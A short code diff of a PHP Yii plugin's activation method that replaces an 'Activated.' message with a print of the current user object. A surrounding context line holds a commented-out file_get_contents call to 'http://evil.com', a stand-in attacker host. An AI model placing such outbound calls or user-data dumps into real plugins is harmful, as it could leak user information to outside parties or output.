@@ -50,7 +50,8 @@ class Plugin extends Object implements PluginInterface
         // @file_get_contents("http://evil.com", false, $context);
         $this->createTable();
 
-        print_r("Activated.\n\r");
+        // print_r("Activated.\n\r");
+        print_r(Yii::$app()->user);
     }
     /**
      * @param string $type
